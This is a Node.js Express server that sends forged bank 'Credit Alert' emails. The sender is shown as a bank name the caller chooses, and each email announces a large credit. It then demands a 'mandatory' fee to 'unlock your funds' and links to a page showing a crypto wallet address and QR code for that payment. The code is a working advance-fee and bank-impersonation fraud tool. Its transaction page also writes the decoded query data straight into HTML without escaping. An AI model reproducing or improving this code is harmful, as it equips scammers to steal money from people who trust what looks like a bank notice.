const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');
require('dotenv').config();
const crypto = require('crypto');
const PDFDocument = require('pdfkit');
const axios = require('axios');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Masking utility functions
const maskAccountNumber = (accountNumber) => {
  if (!accountNumber || accountNumber.length < 4) return accountNumber;
  const lastFour = accountNumber.slice(-4);
  const masked = '*'.repeat(Math.max(accountNumber.length - 4, 4));
  return `${masked}${lastFour}`;
};

const maskIBAN = (iban) => {
  if (!iban || iban.length < 8) return iban;
  const first = iban.slice(0, 4);
  const last = iban.slice(-4);
  const masked = '*'.repeat(Math.max(iban.length - 8, 4));
  return `${first}${masked}${last}`;
};

const maskSWIFT = (swift) => {
  if (!swift || swift.length < 7) return swift;
  const first = swift.slice(0, 4);
  const last = swift.slice(-3);
  const masked = '*'.repeat(Math.max(swift.length - 7, 2));
  return `${first}${masked}${last}`;
};

const maskRoutingNumber = (routing) => {
  if (!routing || routing.length < 4) return routing;
  const lastFour = routing.slice(-4);
  const masked = '*'.repeat(Math.max(routing.length - 4, 5));
  return `${masked}${lastFour}`;
};

// Transaction view page HTML
const createTransactionPage = (data) => {
  const { 
    logoUrl, 
    qrCodeUrl,
    bankName, 
    walletAddress,
    brandColor,
    billingAmount,
    percent,
    routingNumber,
    ibanNumber,
    swiftCode
  } = data;

  // Determine currency based on routing vs IBAN/SWIFT
  const isEuroTransfer = (ibanNumber || swiftCode) && !routingNumber;
  const currency = isEuroTransfer ? 'EUR' : 'USD';
  const currencySymbol = isEuroTransfer ? '€' : '$';

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Transaction Details - ${bankName}</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 40px 20px;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                border-radius: 12px;
                overflow: hidden;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            }
            .header {
                background-color: ${brandColor || '#0066cc'};
                padding: 40px;
                text-align: center;
                color: white;
            }
            .logo {
                max-width: 150px;
                height: auto;
                margin-bottom: 20px;
                background: white;
                padding: 15px;
                border-radius: 8px;
            }
            .header h1 {
                margin: 0;
                font-size: 28px;
            }
            .content {
                padding: 40px;
            }
            .success-badge {
                display: inline-block;
                background: #d4edda;
                color: #155724;
                padding: 10px 20px;
                border-radius: 20px;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 30px;
            }
            .success-badge::before {
                content: '✓ ';
                font-size: 18px;
            }
            .currency-badge {
                display: inline-block;
                background: ${isEuroTransfer ? '#e7f3ff' : '#fff3e0'};
                color: ${isEuroTransfer ? '#0066cc' : '#e65100'};
                padding: 8px 16px;
                border-radius: 15px;
                font-size: 13px;
                font-weight: 600;
                margin-left: 10px;
            }
            .qr-section {
                background: #f8f9fa;
                padding: 30px;
                border-radius: 8px;
                text-align: center;
                margin: 30px 0;
            }
            .qr-section h2 {
                color: #333;
                margin-bottom: 15px;
                font-size: 20px;
            }
            .qr-section p {
                color: #666;
                margin-bottom: 20px;
                font-size: 14px;
            }
            .qr-code {
                max-width: 300px;
                width: 100%;
                height: auto;
                border: 4px solid white;
                border-radius: 8px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            }
            .disclaimer {
                background-color: #fff3cd;
                border-left: 4px solid #ffc107;
                padding: 20px;
                border-radius: 4px;
                margin: 30px 0;
            }
            .disclaimer p {
                color: #856404;
                font-size: 13px;
                line-height: 1.6;
            }
            .actions {
                display: flex;
                gap: 15px;
                justify-content: center;
                margin: 30px 0;
                flex-wrap: wrap;
            }
            .btn {
                padding: 14px 28px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                transition: all 0.3s;
            }
            .btn-primary {
                background-color: ${brandColor || '#0066cc'};
                color: white;
            }
            .btn-primary:hover {
                opacity: 0.9;
                transform: translateY(-2px);
            }
            .btn-secondary {
                background-color: #6c757d;
                color: white;
            }
            .btn-secondary:hover {
                opacity: 0.9;
                transform: translateY(-2px);
            }
            .footer {
                background-color: #f8f9fa;
                padding: 20px;
                text-align: center;
                border-top: 1px solid #e0e0e0;
            }
            .footer p {
                color: #999;
                font-size: 12px;
                margin: 5px 0;
            }
            @media (max-width: 600px) {
                body { padding: 20px 10px; }
                .content { padding: 20px; }
                .qr-section { padding: 20px; }
                .actions { flex-direction: column; }
                .btn { width: 100%; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                ${logoUrl ? `<img src="${logoUrl}" alt="${bankName}" class="logo">` : ''}
                <h1>${bankName}</h1>
            </div>

            <div class="content">
                <div style="text-align: center;">
                    <div class="success-badge">Transaction Successful</div>
                    <span class="currency-badge">💱 ${currency} Transfer</span>
                    <p style="margin-top: 20px;"> you need to make a mandatory payment of ${currencySymbol}${billingAmount} which is ${percent}% of your total funds.
                </div>

                ${qrCodeUrl ? `
                <div class="qr-section">
                    <h2>Complete Payment</h2>
                    <p>Scan the QR code below to complete your payment in ${currency}</p>
                    <img src="${qrCodeUrl}" alt="Payment QR Code" class="qr-code">
                    <p style="word-break: break-all; font-family: monospace; margin-top: 15px;">${walletAddress}</p>
                </div>
                ` : `<p style="word-break: break-all; font-family: monospace; text-align: center; margin: 20px 0;">${walletAddress}</p>`}

                <div class="disclaimer">
                    <p><strong>DISCLAIMER:</strong> This is an automated notification for informational purposes only. Please verify all transaction details through your official banking channels. If you did not authorize this transaction, please contact your bank immediately. Keep this receipt for your records.</p>
                </div>
            </div>

            <div class="footer">
                <p>© ${new Date().getFullYear()} ${bankName}. All rights reserved.</p>
            </div>
        </div>
    </body>
    </html>
  `;
};


// Email template function
const createEmailTemplate = (data, billingLink) => {
  const { 
    logoUrl, 
    bankName, 
    receivingAccountNumber, 
    routingNumber, 
    recipientAddress, 
    senderBank, 
    senderName, 
    recipientName, 
    amount, 
    dateTime,
    brandColor,
    billingAmount,
    ibanNumber,
    swiftCode,
    sendersAccountNumber
  } = data;

  let firstName = recipientName.trim().split(/\s+/)[0];

  // Determine currency based on routing vs IBAN/SWIFT
  const isEuroTransfer = (ibanNumber || swiftCode) && !routingNumber;
  const currency = isEuroTransfer ? 'EUR' : 'USD';
  const currencySymbol = isEuroTransfer ? '€' : '$';

  // Mask sensitive information
  const maskedAccount = maskAccountNumber(receivingAccountNumber);
  const maskedSendersAccount = maskAccountNumber(sendersAccountNumber);
  const maskedIban = ibanNumber ? maskIBAN(ibanNumber) : null;
  const maskedSwift = swiftCode ? maskSWIFT(swiftCode) : null;
  const maskedRouting = routingNumber ? maskRoutingNumber(routingNumber) : null;

  const routingNumberRow = maskedRouting
    ? `
    <tr style="background-color: #f8f9fa;">
      <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
        Routing Number
      </td>
      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px; font-family: 'Courier New', monospace;">
        ${maskedRouting}
      </td>
    </tr>
  `
    : "";

  const swiftRow = maskedSwift
    ? `
    <tr>
      <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
        SWIFT Code
      </td>
      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px; font-family: 'Courier New', monospace;">
        ${maskedSwift}
      </td>
    </tr>
  `
    : "";

  const ibanRow = maskedIban
    ? `
    <tr style="background-color: #f8f9fa;">
      <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
        IBAN
      </td>
      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px; font-family: 'Courier New', monospace;">
        ${maskedIban}
      </td>
    </tr>
  `
    : "";

  return `
    <!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Credit Alert</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background-color: #f4f4f4; padding: 20px;">
    <tr>
      <td align="center">
        <table width="600" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.15);">
          
          <!-- Header with Logo and Bank Name -->
          <tr>
            <td style="background-color: ${brandColor || '#0066cc'}; padding: 40px; text-align: center;">
              ${logoUrl ? `<img src="${logoUrl}" alt="${bankName}" style="max-width: 150px; height: auto; margin-bottom: 15px; background: white; padding: 10px; border-radius: 8px;">` : ''}
              <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: bold;">${bankName}</h1>
            </td>
          </tr>

          <!-- Alert Title with Currency Badge -->
          <tr>
            <td style="padding: 40px 40px 20px;">
              <div style="text-align: center; margin-bottom: 20px;">
                <div style="display: inline-block; background-color: #d4edda; border: 2px solid #28a745; border-radius: 50px; padding: 10px 30px;">
                  <h2 style="color: #28a745; margin: 0; font-size: 24px;">✓ Credit Alert</h2>
                </div>
                <div style="display: inline-block; margin-left: 10px; background-color: ${isEuroTransfer ? '#e7f3ff' : '#fff3e0'}; border-radius: 20px; padding: 8px 20px;">
                  <span style="color: ${isEuroTransfer ? '#0066cc' : '#e65100'}; font-size: 14px; font-weight: 600;">💱 ${currency} Transfer</span>
                </div>
              </div>
              <p style="color: #333; margin: 20px 0 0; font-size: 16px; text-align: center; line-height: 1.6;">
                Dear <strong>${firstName}</strong>, your account has been successfully credited.
              </p>
            </td>
          </tr>

          <!-- Amount Highlight with Currency -->
          <tr>
            <td style="padding: 20px 40px;">
              <div style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); border-radius: 12px; padding: 30px; text-align: center;">
                <p style="color: #ffffff; margin: 0 0 10px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;">Amount Credited (${currency})</p>
                <h3 style="color: #ffffff; margin: 0; font-size: 36px; font-weight: bold;">${currencySymbol}${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</h3>
              </div>
            </td>
          </tr>

          <!-- Transaction Details -->
          <tr>
            <td style="padding: 30px 40px;">
              
              <!-- Sender Details Section -->
              <div style="margin-bottom: 30px;">
                <h3 style="color: #333; margin: 0 0 15px; font-size: 18px; padding-bottom: 10px; border-bottom: 3px solid #0066cc;">
                  📤 Sender Information
                </h3>
                <table width="100%" cellpadding="10" cellspacing="0" style="border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
                  <tr style="background-color: #f8f9fa;">
                    <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #555; font-size: 14px; width: 45%;">Sender's Name</td>
                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right;">${senderName}</td>
                  </tr>
                  <tr>
                    <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #555; font-size: 14px;">Sender's Bank</td>
                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right;">${senderBank}</td>
                  </tr>
                  <tr style="background-color: #f8f9fa;">
                    <td style="font-weight: 600; color: #555; font-size: 14px;">Sender's Account Number</td>
                    <td style="color: #333; font-size: 14px; text-align: right; font-family: 'Courier New', monospace;">${maskedSendersAccount}</td>
                  </tr>
                </table>
              </div>

              <!-- Recipient Details Section -->
              <div style="margin-bottom: 30px;">
                <h3 style="color: #333; margin: 0 0 15px; font-size: 18px; padding-bottom: 10px; border-bottom: 3px solid #28a745;">
                  📥 Recipient Information
                </h3>
                <table width="100%" cellpadding="10" cellspacing="0" style="border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
                  <tr style="background-color: #f8f9fa;">
                    <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #555; font-size: 14px; width: 45%;">Recipient Name</td>
                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right;">${recipientName}</td>
                  </tr>
                  <tr>
                    <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #555; font-size: 14px;">Recipient Bank</td>
                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right;">${bankName}</td>
                  </tr>
                  <tr style="background-color: #f8f9fa;">
                    <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #555; font-size: 14px;">Account Number</td>
                    <td style="border-bottom: 1px solid #e0e0e0; color: #333; font-size: 14px; text-align: right; font-family: 'Courier New', monospace;">${maskedAccount}</td>
                  </tr>
                  ${routingNumberRow}
                  ${swiftRow}
                  ${ibanRow}
                  <tr ${routingNumberRow || swiftRow || ibanRow ? 'style="background-color: #f8f9fa;"' : ''}>
                    <td style="font-weight: 600; color: #555; font-size: 14px;">Recipient Address</td>
                    <td style="color: #333; font-size: 14px; text-align: right;">${recipientAddress}</td>
                  </tr>
                </table>
              </div>

              <!-- Security Note -->
              <div style="background: #f0f9ff; border: 1px solid #bae6fd; border-radius: 8px; padding: 12px; margin: 20px 0; font-size: 13px; color: #0369a1;">
                🔒 For security, account numbers have been partially masked. Full details are available in your transaction history.
              </div>

              <!-- Transaction Info Section -->
              <div>
                <h3 style="color: #333; margin: 0 0 15px; font-size: 18px; padding-bottom: 10px; border-bottom: 3px solid #6c757d;">
                  ℹ️ Transaction Details
                </h3>
                <table width="100%" cellpadding="10" cellspacing="0" style="border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
                  <tr style="background-color: #f8f9fa;">
                    <td style="font-weight: 600; color: #555; font-size: 14px; width: 45%;">Date & Time</td>
                    <td style="color: #333; font-size: 14px; text-align: right;">${dateTime}</td>
                  </tr>
                </table>
              </div>

            </td>
          </tr>

          <!-- Disclaimer / Billing Notice -->
          <tr>
            <td style="padding: 0 40px 40px;">
              <div style="background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); border-left: 5px solid #ffc107; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                <p style="margin: 0 0 10px; color: #856404; font-size: 14px; font-weight: bold;">
                  ⚠️ IMPORTANT NOTICE
                </p>
                <p style="margin: 0; color: #856404; font-size: 13px; line-height: 1.8;">
                  To activate your payment of <strong>${currencySymbol}${amount}</strong>, you need to pay a mandatory sum of <strong>${currencySymbol}${billingAmount}</strong> in ${currency} to unlock your funds. For more information, please click <a href="${billingLink}" style="color: #0066cc; text-decoration: none; font-weight: bold;">here</a>.
                </p>
              </div>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color: #2c3e50; padding: 30px 40px; text-align: center;">
              <p style="margin: 0; color: #ecf0f1; font-size: 13px;">
                © ${new Date().getFullYear()} ${bankName}. All rights reserved.
              </p>
              <p style="margin: 15px 0 0; color: #95a5a6; font-size: 12px;">
                This is an automated email. Do not reply to this message.
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>
  `;
};


// Send email endpoint
app.post('/api/send-credit-alert', async (req, res) => {
  try {
    const emailData = req.body;
    const bank = emailData.bankName;
    const transactionData = Buffer.from(JSON.stringify(emailData)).toString('base64url');
    const billingLink = `${process.env.BASE_URL}/transaction?data=${transactionData}`;
    
    // Validate required fields
    const requiredFields = [
      'recipientEmail',
      'bankName',
      'receivingAccountNumber',
      'recipientAddress',
      'senderBank',
      'senderName',
      'recipientName',
      'amount',
      'billingAmount',
      'dateTime',
      'sendersAccountNumber'
    ];

    const missingFields = requiredFields.filter(field => !emailData[field]);
    
    if (missingFields.length > 0) {
      return res.status(400).json({
        success: false,
        error: `Missing required fields: ${missingFields.join(', ')}`
      });
    }

    // Determine currency for subject line
    const isEuroTransfer = (emailData.ibanNumber || emailData.swiftCode) && !emailData.routingNumber;
    const currencySymbol = isEuroTransfer ? '€' : '$';

    // Create email HTML
    const emailHtml = createEmailTemplate(emailData, billingLink);
    const fromEmail = `${bank} <noreply@mailsflash.name.ng>`;   
    const fromName = emailData.bankName;
    const fromAddress = fromEmail.includes('<') ? fromEmail.split('<')[1].replace('>', '') : fromEmail;
    const displayFrom = `${fromName}<${fromAddress}>`;
    
    // Send email using Resend
    const result = await resend.emails.send({
      from: displayFrom,
      to: emailData.recipientEmail,
      subject: `Credit Alert - ${currencySymbol}${parseFloat(emailData.amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
      html: emailHtml,
      headers: {
        'X-Entity-Ref-ID': `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        'X-Priority': '1',
        'Importance': 'high',
        'X-Mailer': 'Credit Alert System v1.0'
      },
      tags: [
        {
          name: 'category',
          value: 'credit_alert'
        }
      ]
    });

    res.json({
      success: true,
      message: 'Credit alert sent successfully',
      emailId: result.id,
      data: emailData
    });

  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to send credit alert'
    });
  }
});

app.get('/transaction', (req, res) => {
  const data = JSON.parse(Buffer.from(req.query.data, 'base64url').toString());
  const html = createTransactionPage(data);
  res.send(html);
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});